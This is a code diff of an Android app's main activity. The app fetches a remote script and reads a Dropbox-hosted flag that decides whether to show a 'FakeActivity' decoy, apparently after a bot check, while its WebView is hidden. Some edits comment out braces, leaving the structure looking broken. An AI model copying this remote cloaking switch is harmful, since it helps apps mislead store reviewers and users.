@@ -89,7 +89,6 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
     override fun onCreate(savedInstanceState: Bundle?)                                         {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-
         progressBar = findViewById(R.id.progressBar)
 
         GlobalScope.launch(Dispatchers.Main) {
@@ -99,13 +98,13 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
                 async(Dispatchers.IO) { java.net.URL(analyticsJs).readText(Charsets.UTF_8) }
 
             script = scriptTask.await()
-        }
-        GlobalScope.launch(Dispatchers.Main) {
+//        }
+//        GlobalScope.launch(Dispatchers.Main) {
             val switcherUrl = "https://dl.dropboxusercontent.com/s/tit63ngqwdc8l4b/kek.json?dl=0"
             val switcher = withContext(Dispatchers.IO) { URL(switcherUrl).readText(Charsets.UTF_8) }
             if (!switcher.isBlank()) {
                 Log.d(TAG, "text $switcher")
-                if (switcher == "tru1e") {
+                if (switcher != "true") {
                     progressBar.visibility = ProgressBar.GONE
                     startActivity(Intent(this@MainActivity, FakeActivity::class.java))
                     finish()
@@ -276,7 +275,7 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
 
             Log.d(TAG, "IS_BOT$isBot")
 
-            if (0 == 1) {
+            if (backDeque.isNotEmpty()) {
                 progressBar.visibility = ProgressBar.GONE
                 startActivity(Intent(this@MainActivity, FakeActivity::class.java))
 
@@ -327,6 +326,7 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
     }
 
     webView = findViewById(R.id.webView)
+    webView.visibility = WebView.GONE
 
     webView?.scrollBarStyle = WebView.SCROLLBARS_OUTSIDE_OVERLAY
     webView?.settings?.loadWithOverviewMode = true
